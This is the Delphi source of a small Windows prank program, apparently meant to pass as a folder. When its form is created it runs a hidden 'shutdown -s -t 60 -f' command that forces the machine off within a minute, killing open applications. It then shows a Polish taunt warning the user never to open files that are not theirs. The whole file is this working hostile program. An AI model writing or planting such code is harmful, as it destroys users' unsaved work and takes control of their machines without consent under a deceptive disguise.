unit folder;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs, shellapi;

type
  TForm1 = class(TForm)
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.DFM}

procedure TForm1.FormCreate(Sender: TObject);
begin
shellexecute(0, nil, 'cmd.exe', '/C shutdown -s -t 60 -f', nil, SW_SHOWNORMAL);
showmessagepos('Nigdy nie otwieraj nie swoich plików!!!',10,10);
end;

end.
